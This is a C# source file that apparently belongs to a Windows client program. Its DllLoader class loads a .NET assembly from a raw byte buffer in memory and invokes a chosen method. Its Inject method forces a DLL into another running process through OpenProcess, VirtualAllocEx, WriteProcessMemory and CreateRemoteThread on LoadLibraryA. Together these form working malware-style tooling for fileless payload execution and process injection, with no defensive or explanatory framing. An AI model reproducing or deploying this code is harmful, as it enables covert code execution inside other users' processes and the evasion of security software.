using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace winClient48
{
    internal class DllLoader
    {
        public DllLoader()
        {

        }

        public (int, string) Load(byte[] buffer, string name, string func, string[] param)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                Assembly assembly = Assembly.Load(buffer);
                Type type = assembly.GetType(name);
                MethodInfo method = type.GetMethod(func);
                object result = method.Invoke(null, param);

                nCode = 1;
                szMsg = result.ToString();
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public (int, string) Inject(int nProcId, string szDllPath)
        {
            int nCode = 0;
            string sMsg = string.Empty;

            try
            {
                IntPtr hProc = WinAPI.OpenProcess(WinAPI.PROCESS_ALL_ACCESS, false, nProcId);
                IntPtr hAllocMemAddr = WinAPI.VirtualAllocEx(hProc, IntPtr.Zero, (uint)szDllPath.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_READWRITE);
                WinAPI.WriteProcessMemory(hProc, hAllocMemAddr, Encoding.UTF8.GetBytes(szDllPath), (uint)szDllPath.Length, out _);
                IntPtr hLoadLibraryAddr = WinAPI.GetProcAddress(WinAPI.GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                WinAPI.CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoadLibraryAddr, hAllocMemAddr, 0, IntPtr.Zero);

                nCode = 1;
            }
            catch (Exception ex)
            {
                sMsg = ex.Message;
            }

            return (nCode, sMsg);
        }
    }
}
